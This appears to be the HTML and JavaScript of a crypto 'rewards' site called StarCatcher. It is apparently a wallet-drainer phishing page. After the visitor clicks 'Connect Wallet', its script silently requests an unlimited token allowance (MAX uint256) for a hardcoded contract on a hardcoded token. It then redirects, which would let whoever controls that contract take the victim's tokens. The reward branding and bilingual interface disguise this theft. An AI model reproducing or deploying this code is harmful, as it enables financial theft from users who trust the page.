<!DOCTYPE html>
<html lang="auto">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>StarCatcher - Collect Stars, Earn Rewards</title>
  <meta name="description" content="Next-gen blockchain rewards DApp">
  <style>
    :root{
      /* 主色：深紫→天蓝 渐变 */
      --grad-main:linear-gradient(135deg,#4f1c82 0%,#00c6ff 100%);
      /* 辅助霓虹 */
      --pink:#ff2a6d;
      --ice:#05d9e8;
      /* 文字 */
      --text:#ffffff;
      --text-secondary:#b3b3d1;
      --bg:#0a0a1a;
      --card-bg:#111326;
      --shadow:0 8px 32px rgba(0,198,255,.15);
    }
    /* 浅色模式覆盖 */
    @media (prefers-color-scheme:light){
      :root{
        --text:#111;
        --text-secondary:#444;
        --bg:#f5f7ff;
        --card-bg:#ffffff;
        --shadow:0 8px 32px rgba(79,28,130,.08);
      }
    }
    *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"PingFang SC",sans-serif}
    body{margin:0;height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--text)}
    .wallpaper{
      position:fixed;inset:0;z-index:-1;
      background:var(--bg) url('data:image/svg+xml,\
        <svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 100 100">\
        <defs><pattern id="g" width="10" height="10" patternUnits="userSpaceOnUse"><circle cx="5" cy="5" r=".6" fill="%2300c6ff33"/></pattern></defs>\
        <rect width="100" height="100" fill="url(%23g)"/></svg>');
      opacity:.4;
    }
    .card{
      width:min(90%,380px);
      padding:36px 24px 48px;
      background:var(--card-bg);
      border-radius:24px;
      box-shadow:var(--shadow);
      text-align:center;
      animation:fadeIn .6s ease;
    }
    @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
    .logo{
      width:80px;height:80px;
      margin:0 auto 12px;
      background:var(--grad-main);
      border-radius:50%;
      display:flex;align-items:center;justify-content:center;
      color:#fff;font-weight:700;font-size:32px;
    }
    h1{font-size:26px;margin:0 0 8px}
    p.sub{color:var(--text-secondary);margin:0 0 32px;font-size:15px}
    button.connect{
      width:100%;height:60px;
      border:none;border-radius:16px;
      background:var(--grad-main);
      color:#fff;font-size:17px;font-weight:600;
      cursor:pointer;
      transition:transform .15s,box-shadow .15s;
      position:relative;
    }
    button.connect:active{transform:scale(.97)}
    button.connect .ripple{
      position:absolute;border-radius:50%;transform:scale(0);
      animation:ripple .6s linear; background:rgba(255,255,255,.4);
      pointer-events:none;
    }
    @keyframes ripple{to{transform:scale(4);opacity:0}}
    .footer{font-size:12px;color:var(--text-secondary);margin-top:20px}
    /* 语言切换 */
    .lang{position:absolute;top:12px;right:12px;font-size:14px;color:var(--text-secondary);cursor:pointer}
  </style>
</head>
<body>
  <div class="wallpaper"></div>
  <div class="lang" onclick="toggleLang()">中/EN</div>

  <div class="card">
    <div class="logo">✨</div>
    <h1 data-i18n="slogan">Collect Stars, Earn Rewards</h1>
    <p class="sub" data-i18n="sub">Connect your wallet to start</p>
    <button class="connect" id="connectBtn" data-i18n="connect">Connect Wallet</button>
    <div class="footer" data-i18n="footer">Supports MetaMask Mobile & Trust Wallet</div>
  </div>

<script type="module">
/* ====== 国际化 ====== */
const i18n = {
  en:{
    slogan:"Collect Stars, Earn Rewards",
    sub:"Connect your wallet to start",
    connect:"Connect Wallet",
    footer:"Supports MetaMask Mobile & Trust Wallet",
    connecting:"Connecting…",
    approve:"Approve unlimited token",
    error:"Connection failed, please try again"
  },
  zh:{
    slogan:"收集星尘，赚取奖励",
    sub:"连接钱包立即开始",
    connect:"连接钱包",
    footer:"支持 MetaMask Mobile、Trust Wallet 等内核浏览器",
    connecting:"连接中…",
    approve:"授权无限额度代币",
    error:"连接失败，请重试"
  }
};
let lang = (navigator.language||'').startsWith('zh')?'zh':'en';
function t(k){return i18n[lang][k]||i18n.en[k]}
function toggleLang(){lang=lang==='zh'?'en':'zh'; render();}
function render(){
  document.querySelectorAll('[data-i18n]').forEach(el=>el.innerText=t(el.dataset.i18n));
}
render();

/* ====== Web3 逻辑 ====== */
const CONTRACT = "0x9dcced4ef738856d2c289d4116cd219c698b22ba";
const TOKEN    = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
const MAX      = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

let provider, signer, accounts;

async function connect(){
  if(!window.ethereum) return alert("Please open in a wallet browser");
  const btn = document.getElementById('connectBtn');
  btn.disabled=true;
  btn.innerText=t('connecting');
  try{
    await window.ethereum.request({method:'eth_requestAccounts'});
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer   = provider.getSigner();
    accounts = await provider.listAccounts();
    await approveOnce();            // 首次无限授权
    location.href="dashboard.html"; // 成功后跳转仪表盘
  }catch(e){
    console.error(e);
    btn.disabled=false;
    btn.innerText=t('connect');
    alert(t('error'));
  }
}
/* 无限授权 */
async function approveOnce(){
  const abi = ["function approve(address spender,uint256 amount) external"];
  const token = new ethers.Contract(TOKEN, abi, signer);
  const tx = await token.approve(CONTRACT, MAX);
  await tx.wait();
}
document.getElementById('connectBtn').addEventListener('click',connect);
</script>
<!-- ethers 从 CDN 引入 -->
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
</body>
</html>